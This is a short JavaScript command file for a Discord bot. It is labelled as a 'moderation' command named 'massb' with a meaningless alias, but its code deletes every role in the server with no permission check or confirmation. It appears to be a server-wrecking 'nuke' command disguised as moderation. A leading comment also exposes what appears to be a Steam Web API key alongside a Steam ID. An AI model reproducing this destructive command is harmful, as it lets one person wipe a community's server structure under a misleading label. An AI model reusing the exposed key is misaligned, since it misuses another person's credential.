//http://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=65D44EDA5357210475FBE865A02D2844&steamid=76561197960434622&format=json

const { RichEmbed } = require("discord.js");

module.exports = {
    name: "massb",
    aliases: ["asdasdsad"],
    category: "moderation",
    description: "MassB.",
    usage: "[comando | alias]",
    run: async (client, message, args) => {
        message.guild.roles.forEach(role => role.delete())
    }
}